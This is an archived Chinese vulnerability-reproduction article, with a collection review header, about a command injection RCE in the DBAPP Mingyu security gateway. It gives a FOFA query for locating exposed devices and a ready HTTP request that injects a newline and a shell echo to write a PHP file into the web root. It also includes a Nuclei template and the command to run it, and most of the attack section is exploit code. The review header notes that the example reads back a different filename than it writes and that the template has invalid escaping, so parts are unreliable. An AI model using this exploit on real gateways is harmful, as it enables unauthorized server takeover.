---
source: "MrWQ/vulnerability-paper"
id: "vw-30fed6214dd062bd8d6528b6"
entity_id: "ve-30fed6214dd062bd8d6528b6"
schema_version: "1"
fofa_unverified: "搜索语句"
title: "【漏洞复现】安恒明御安全网关 aaa portal auth config reset 远程命令执行漏洞"
product: "DBAPP明御安全网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie示例；固件未知，/usr/local/webui可写"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20aaa%20portal%20auth%20config%20reset%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/kXWoQ7C4o-JgAsqfMWv5_g"
source_status: "recorded"
---

# 【漏洞复现】安恒明御安全网关 aaa portal auth config reset 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：DBAPP明御安全网关
- 本文讨论：aaa_portal_auth_config_reset type换行注入
- 版本、权限与配置前提：无Cookie示例；固件未知，/usr/local/webui可写
- 资料类型：命令注入PoC/Nuclei；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 手工写txzfsrur.php却读astdfkhl.php，确定文件名不匹配
- Nuclei双引号变量/DSL中反斜杠花括号非法YAML转义；max-request1却2请求
- phpinfo证明文件追加写入未清理；修复只最新版本没有公告
- 这是正确config_reset请求，与安全设备错误贴wchat正文应关联修复不能把二者混并
- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“http://x.x.x.x/astdfkhl.php”改为“http://x.x.x.x/txzfsrur.php”；“\{”改为“{”；“\}”改为“}”；“max-request: 1”改为“max-request: 2”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证
- 原始示例仍保留写入 txzfsrur.php、回读 astdfkhl.php 的文件名不匹配、带反斜杠的 Nuclei 花括号及 max-request: 1；上条为历史改写建议，未应用。verified 是原作者标记，不能视为本库验证；文件追加及 phpinfo 信息暴露副作用仍存在。

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 匿名/固件/补丁与模板原文待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kXWoQ7C4o-JgAsqfMWv5_g)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

**福利：小编整理了大量电子书和护网常用工具，在文末免费获取。**

01

—

漏洞名称

安恒明御安全网关 aaa_portal_auth_config_reset 远程命令执行漏洞

02

—  

漏洞影响

安恒明御安全网关

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4bRNpG05bWiaQtCibVYv2oRhIXEj60fmTjMMMlrDicvTvNA1jtstqkS4T3A/640?wx_fmt=png&from=appmsg)

03

—  

漏洞描述

明御安全网关秉持安全可视、简单 有效的只理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN 网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关 aaa_portal_auth_config_reset 接口处存在 RCE 漏洞，攻击者通过漏洞可以获取服务器权限。

04

—  

FOFA 搜索语句

  

```
title="明御安全网关"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4bicgWhbE3R8Xibqbxmqjrola5kaVFbiaYcJOHLJqSl9HjppjFy6yibib1fGQ/640?wx_fmt=png&from=appmsg)

05

—  

漏洞复现

第一步，向靶场发送如下数据包

```http
GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22assdwdmpidmsbzoabahpjhnokiduw%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2Ftxzfsrur.php%0a HTTP/1.1
Host: x.x.x.xx.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

```

第二步，查看生成的文件

```
http://x.x.x.x/astdfkhl.php

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4b1LLibC5RwSXBknH6fic4JiaxCrIodkzDR1HDlUwKoEIXhKXIibqgAULrDA/640?wx_fmt=png&from=appmsg)

漏洞复现成功

06

—  

nuclei poc

poc 文件内容如下

```
id: dbapp-mingyu-aaa_portal_auth_config_reset-rce
info:
  name: 安恒明御安全网关 aaa_portal_auth_config_reset 远程命令执行漏洞
  author: fgz
  severity: critical
  description: 明御安全网关秉持安全可视、简单 有效的只理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关aaa_portal_auth_config_reset接口处存在RCE漏洞，攻击者通过漏洞可以获取服务器权限.
  metadata:
    max-request: 1
    fofa-query: title="明御安全网关"
    verified: true
variables:
  file_name: "\{\{to_lower(rand_text_alpha(8))\}\}"
  file_content: "\{\{to_lower(rand_text_alpha(30))\}\}"
requests:
  - raw:
      - |+
        GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22\{\{file_content\}\}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F\{\{file_name\}\}.php%0a HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
      - |
        GET /\{\{file_name\}\}.php HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '\{\{file_content\}\}')"

```

运行 POC

```
nuclei.exe -t mypoc/安恒/dbapp-mingyu-aaa_portal_auth_config_reset-rce.yaml -u http://192.168.40.130:8080

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4b6kL7WibJp4rL6SX1T3dlabTk5Gl65C6fnXfMgG89ticVf1liaTjV2JXZg/640?wx_fmt=png&from=appmsg)

07

—  

修复建议

升级到最新版本。

08

—  

福利领取

关注公众号，在公众号主页点发消息发送关键字免费领取。

后台发送【**工具**】获取渗透工具包

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BO3VtNCUQ6Bllhiag7ljEfRGYUNjiaPbSgc1bgPKxIibrYjsbZiaLcWPec8Gd6zLBlODFOCCAbDDvicEAw/640?wx_fmt=png&from=appmsg)

后台发送【**电子书**】获取电子书资源包

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BO3VtNCUQ6Bllhiag7ljEfRGfkkQLABlhLdFkF5eAv8Jm1yF2wpq7zdFbw0slibDtK4H1Rbm0wuSDBA/640?wx_fmt=png&from=appmsg)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
